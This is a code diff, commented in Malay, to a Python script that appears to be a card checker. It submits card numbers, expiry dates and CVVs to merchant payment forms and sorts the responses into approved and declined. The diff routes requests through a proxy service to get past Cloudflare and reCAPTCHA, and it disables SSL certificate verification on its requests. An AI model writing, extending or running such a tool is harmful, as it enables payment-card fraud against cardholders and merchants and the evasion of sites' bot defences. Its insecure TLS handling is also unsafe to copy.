@@ -30,6 +30,7 @@ logging.basicConfig(level=logging.INFO, format='%(message)s', datefmt='%H:%M:%S'
 VALID_YEARS = list(range(2025, 2036))
 TIMEOUT_SECONDS = 45
 
+# Custom Adapter untuk Paksa Ignore SSL Verification (Penting untuk Bright Data)
 class IgnoreSSLAdapter(requests.adapters.HTTPAdapter):
     def init_poolmanager(self, *args, **kwargs):
         ctx = create_urllib3_context()
@@ -78,6 +79,7 @@ def get_card_type(ccnum):
 
 def create_session():
     session = requests.Session()
+    # Mount adapter ni supaya dia tak verify SSL
     session.mount('https://', IgnoreSSLAdapter())
     session.mount('http://', IgnoreSSLAdapter())
     
@@ -97,7 +99,6 @@ def create_session():
         "Connection": "keep-alive",
         "Upgrade-Insecure-Requests": "1",
         "Cache-Control": "max-age=0",
-        # PENTING: Header ni trigger Web Unlocker untuk bypass Cloudflare + reCAPTCHA
         "X-BD-Proxy-Active": "1" 
     }
         
@@ -181,9 +182,9 @@ def get_form_action_and_payload(session, url):
     try:
         logging.info(f"{Colors.OKCYAN}[*] Requesting site via Bright Data Web Unlocker...{Colors.ENDC}")
         
-        resp = session.get(url, timeout=45, allow_redirects=True)
+        # verify=False supaya dia lepas sijil SSL Bright Data
+        resp = session.get(url, timeout=45, allow_redirects=True, verify=False)
         
-        # Tambah logging supaya kita nampak apa Bright Data bagi balik
         logging.info(f"{Colors.OKCYAN}[*] Bright Data Response Status: {resp.status_code}{Colors.ENDC}")
         
         if resp.status_code != 200 or not resp.text:
@@ -192,7 +193,6 @@ def get_form_action_and_payload(session, url):
             
         html = resp.text
         
-        # Kalau Cloudflare masih block
         if "Just a moment..." in html or "cf-challenge" in html:
             logging.error(f"{Colors.FAIL}[-] Cloudflare still blocking via Bright Data.{Colors.ENDC}")
             return None, None, None, None, "Cloudflare protection"
@@ -477,7 +477,7 @@ def process_card_on_site(site_data, ccnum, mm, yy, cvv):
                 "Upgrade-Insecure-Requests": "1"
             })
 
-            response = session.post(form_action, data=clean_initial, timeout=45, allow_redirects=True)
+            response = session.post(form_action, data=clean_initial, timeout=45, allow_redirects=True, verify=False)
 
             soup_resp = BeautifulSoup(response.text, 'html.parser')
 
@@ -496,7 +496,7 @@ def process_card_on_site(site_data, ccnum, mm, yy, cvv):
                         merged_payload[k] = v
 
                 clean_confirm = build_clean_payload(merged_payload, user_data, ccnum, mm, yy, cvv, qfkey, base_url, is_confirm=True)
-                confirm_response = session.post(form_action, data=clean_confirm, timeout=45, allow_redirects=True)
+                confirm_response = session.post(form_action, data=clean_confirm, timeout=45, allow_redirects=True, verify=False)
                 
                 if confirm_response.status_code == 500:
                     result = {'approved': False, 'has_msg': True, 'message': 'Site Error / Not Authorize', 'clean_response': 'Site Error'}
